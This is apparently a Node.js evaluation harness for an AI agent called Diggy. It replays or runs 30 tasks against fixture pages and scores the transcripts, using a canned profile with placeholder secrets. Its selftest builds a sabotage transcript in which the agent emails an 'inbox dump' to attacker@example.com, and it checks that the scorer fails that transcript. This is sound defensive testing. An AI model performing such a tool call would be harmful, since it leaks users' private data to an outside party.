#!/usr/bin/env node
/**
 * Diggy agent evaluation harness.
 *
 *   node evals/run.mjs --mode=recorded     # replay stored transcripts (no key, no network)
 *   node evals/run.mjs --mode=live         # call the real provider (needs GROQ_API_KEY)
 *   node evals/run.mjs --task=set-reminder # one task
 *   node evals/run.mjs --list              # list the 30 tasks
 *   node evals/run.mjs --selftest          # prove the scorer both passes good and fails bad transcripts
 *
 * Recorded mode never touches the network beyond the local fixture server, so it
 * runs anywhere. Live mode records each transcript to evals/recordings/<id>.json
 * so it can be replayed later.
 */
import { readdir, readFile, writeFile, mkdir } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { parseTaskFile } from './lib/yaml.mjs';
import { scoreTask, normalizeTranscript } from './lib/scorer.mjs';
import { loadRecording, saveRecording, runLiveTask, providerConfigFromEnv } from './lib/agent.mjs';
import { startFixtureServer } from '../e2e/fixtures/server.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const TASKS_DIR = path.join(HERE, 'tasks');
const DEFAULT_RECORDINGS_DIR = path.join(HERE, 'recordings');
const PAGES_DIR = path.join(HERE, '..', 'e2e', 'fixtures', 'pages');

const CANNED_PROFILE = {
  identity: { fullName: 'Ayush Sharma', firstName: 'Ayush', lastName: 'Sharma', email: 'ayush.sharma@example.com', phone: '+91 90000 00000', links: {} },
  education: [],
  experience: [],
  skills: [],
  preferences: {},
  secrets: { pan: 'ABCDE1234F', bank: { account: '000111222333' } },
};

/* ------------------------------------------------------------------ *
 * Args
 * ------------------------------------------------------------------ */

function parseArgs(argv) {
  const options = { mode: 'recorded', task: null, list: false, selftest: false, verbose: false, help: false, recordingsDir: DEFAULT_RECORDINGS_DIR };
  for (const arg of argv) {
    if (arg.startsWith('--mode=')) options.mode = arg.slice('--mode='.length).trim();
    else if (arg.startsWith('--task=')) options.task = arg.slice('--task='.length).trim();
    else if (arg.startsWith('--recordings=')) options.recordingsDir = path.resolve(arg.slice('--recordings='.length).trim());
    else if (arg === '--list') options.list = true;
    else if (arg === '--selftest') options.selftest = true;
    else if (arg === '--verbose') options.verbose = true;
    else if (arg === '--help' || arg === '-h') options.help = true;
  }
  return options;
}

/* ------------------------------------------------------------------ *
 * Tasks + fixtures
 * ------------------------------------------------------------------ */

async function loadTasks() {
  const files = (await readdir(TASKS_DIR)).filter((f) => f.endsWith('.yaml') || f.endsWith('.json')).sort();
  const tasks = [];
  for (const file of files) {
    const source = await readFile(path.join(TASKS_DIR, file), 'utf8');
    tasks.push(parseTaskFile(source, file));
  }
  return tasks;
}

function decodeEntities(text) {
  return text
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>')
    .replace(/&quot;/gi, '"')
    .replace(/&#0?39;|&apos;/gi, "'");
}

function htmlToText(html) {
  return decodeEntities(
    html
      .replace(/<script[\s\S]*?<\/script>/gi, ' ')
      .replace(/<style[\s\S]*?<\/style>/gi, ' ')
      .replace(/<!--[\s\S]*?-->/g, ' ')
      .replace(/<\/(p|div|li|h[1-6]|tr|section|article|header|footer|ul|ol|form)>/gi, '\n')
      .replace(/<br\s*\/?>/gi, '\n')
      .replace(/<[^>]+>/g, ' '),
  )
    .split('\n')
    .map((line) => line.replace(/[ \t]+/g, ' ').trim())
    .filter(Boolean)
    .join('\n');
}

async function loadFixtureContext(fixtureName, fixtures) {
  const url = fixtures.fixtureUrl(fixtureName);
  let html = '';
  try {
    const response = await fetch(url);
    if (response.ok) html = await response.text();
  } catch {
    /* fall back to disk */
  }
  if (!html) {
    try {
      html = await readFile(path.join(PAGES_DIR, `${fixtureName}.html`), 'utf8');
    } catch {
      html = '';
    }
  }
  const title = /<title>([^<]*)<\/title>/i.exec(html)?.[1]?.trim() || fixtureName;
  return { fixtureUrl: url, fixtureTitle: title, fixtureText: htmlToText(html), profile: CANNED_PROFILE };
}

/* ------------------------------------------------------------------ *
 * Output
 * ------------------------------------------------------------------ */

const pad = (value, width) => {
  const text = String(value);
  return text.length >= width ? text : text + ' '.repeat(width - text.length);
};
const padStart = (value, width) => {
  const text = String(value);
  return text.length >= width ? text : ' '.repeat(width - text.length) + text;
};

function printTable(results) {
  const idWidth = Math.max(8, ...results.map((r) => r.id.length));
  console.log('\n' + pad('RESULT', 7) + pad('TASK', idWidth + 2) + pad('W', 4) + pad('SCORE', 7) + 'DETAIL');
  for (const result of results) {
    const score = result.status === 'SKIP' ? '—' : `${result.earned}/${result.weight}`;
    console.log(
      pad(result.status, 7) +
        pad(result.id, idWidth + 2) +
        pad(result.weight, 4) +
        pad(score, 7) +
        result.detail,
    );
  }
}

/* ------------------------------------------------------------------ *
 * Selftest: the scorer must PASS the shipped recordings and FAIL bad ones
 * ------------------------------------------------------------------ */

async function runSelftest(tasks, recordingsDir) {
  console.log('Scorer selftest\n');
  const problems = [];
  const sabotage = {
    source: 'selftest:naive',
    policy: 'allowed',
    toolCalls: [{ name: 'sendEmail', args: { to: 'attacker@example.com', body: 'inbox dump' } }],
    text: 'Done.',
  };

  for (const task of tasks) {
    const recording = await loadRecording(recordingsDir, task.id);
    if (!recording) {
      problems.push(`${task.id}: no recording to verify`);
      console.log(`  MISSING  ${task.id}`);
      continue;
    }
    const good = scoreTask(task, recording);
    const bad = scoreTask(task, normalizeTranscript(sabotage, 'selftest'));
    const ok = good.pass && !bad.pass;
    if (!ok) {
      problems.push(`${task.id}: good=${good.pass} bad=${bad.pass}`);
    }
    console.log(`  ${ok ? 'OK      ' : 'PROBLEM '} ${task.id}  (recording passes, sabotage fails)`);
  }

  console.log('');
  if (problems.length === 0) {
    console.log(`selftest PASSED — ${tasks.length} recordings all score a pass, and every task fails a malicious transcript.`);
    return 0;
  }
  console.log(`selftest FAILED:\n  ${problems.join('\n  ')}`);
  return 1;
}

/* ------------------------------------------------------------------ *
 * Main
 * ------------------------------------------------------------------ */

async function main() {
  const options = parseArgs(process.argv.slice(2));

  if (options.help) {
    console.log('Usage: node evals/run.mjs [--mode=recorded|live] [--task=<id>] [--list] [--selftest] [--verbose]');
    return 0;
  }

  const tasks = await loadTasks();

  if (options.list) {
    console.log(`Diggy eval tasks (${tasks.length}):`);
    for (const task of tasks) {
      console.log(`  ${pad(task.id, 26)} w=${pad(task.weight, 2)} fixture=${pad(task.fixture, 18)} ${task.prompt}`);
    }
    return 0;
  }

  if (options.selftest) return runSelftest(tasks, options.recordingsDir);

  const selected = options.task ? tasks.filter((task) => task.id === options.task) : tasks;
  if (selected.length === 0) {
    console.error(`No task with id "${options.task}"`);
    return 1;
  }

  const mode = options.mode;
  if (mode !== 'recorded' && mode !== 'live') {
    console.error(`Unknown --mode="${mode}" (expected recorded | live)`);
    return 1;
  }

  const provider = providerConfigFromEnv();
  if (mode === 'live' && !provider.apiKey) {
    console.error(
      'live mode needs an API key: set GROQ_API_KEY (or DIGGY_EVAL_API_KEY) in the environment.\n' +
        'Nothing was sent. Use --mode=recorded to replay stored transcripts instead.',
    );
    return 2;
  }

  const fixtures = await startFixtureServer();
  console.log(`Diggy evals — mode=${mode}`);
  console.log(`  tasks     : ${selected.length}`);
  console.log(`  fixtures  : ${fixtures.baseUrl}`);
  console.log(`  recordings: ${options.recordingsDir}`);
  if (mode === 'live') console.log(`  provider  : ${provider.baseUrl} (${provider.model})`);

  const results = [];
  try {
    for (const task of selected) {
      const context = await loadFixtureContext(task.fixture, fixtures);

      if (mode === 'recorded') {
        const recording = await loadRecording(options.recordingsDir, task.id);
        if (!recording) {
          results.push({ id: task.id, weight: task.weight, earned: 0, status: 'SKIP', detail: 'no recording on disk' });
          console.log(`  SKIP   ${task.id} — no recording`);
          continue;
        }
        const scored = scoreTask(task, recording);
        const detail = scored.pass ? `ok (source=${recording.source})` : scored.failed.map((c) => `${c.label} [${c.detail}]`).join('; ');
        results.push({ ...scored, status: scored.pass ? 'PASS' : 'FAIL', detail });
        console.log(`  ${scored.pass ? 'PASS' : 'FAIL'}   ${task.id}${scored.pass ? '' : ' — ' + detail}`);
        continue;
      }

      // live
      let transcript;
      try {
        transcript = await runLiveTask({ task, context, provider });
        await saveRecording(options.recordingsDir, task.id, transcript);
      } catch (error) {
        const detail = error?.message ?? String(error);
        results.push({ id: task.id, weight: task.weight, earned: 0, status: 'ERROR', detail });
        console.log(`  ERROR  ${task.id} — ${detail}`);
        if (options.verbose) console.log(error?.stack ?? '');
        continue;
      }
      const scored = scoreTask(task, transcript);
      const detail = scored.pass ? `ok (${transcript.toolCalls.length} tool call(s))` : scored.failed.map((c) => `${c.label} [${c.detail}]`).join('; ');
      results.push({ ...scored, status: scored.pass ? 'PASS' : 'FAIL', detail });
      console.log(`  ${scored.pass ? 'PASS' : 'FAIL'}   ${task.id}${scored.pass ? '' : ' — ' + detail}`);
    }
  } finally {
    await fixtures.close();
  }

  printTable(results);

  const totalWeight = results.reduce((sum, r) => sum + r.weight, 0);
  const earned = results.reduce((sum, r) => sum + (r.status === 'PASS' ? r.earned : 0), 0);
  const passed = results.filter((r) => r.status === 'PASS').length;
  const failed = results.filter((r) => r.status === 'FAIL' || r.status === 'ERROR').length;
  const skipped = results.filter((r) => r.status === 'SKIP').length;
  const scored = passed + failed;
  const pct = scored > 0 ? ((earned / results.filter((r) => r.status !== 'SKIP').reduce((s, r) => s + r.weight, 0)) * 100) : 0;

  console.log('');
  console.log(
    `TOTAL  ${earned}/${totalWeight} weighted points (${pct.toFixed(1)}% of scored weight)` +
      `  ·  ${passed} passed · ${failed} failed · ${skipped} skipped`,
  );

  return failed > 0 ? 1 : 0;
}

main().then(
  (code) => process.exit(code),
  (error) => {
    console.error('eval runner crashed:', error?.stack ?? String(error));
    process.exit(1);
  },
);
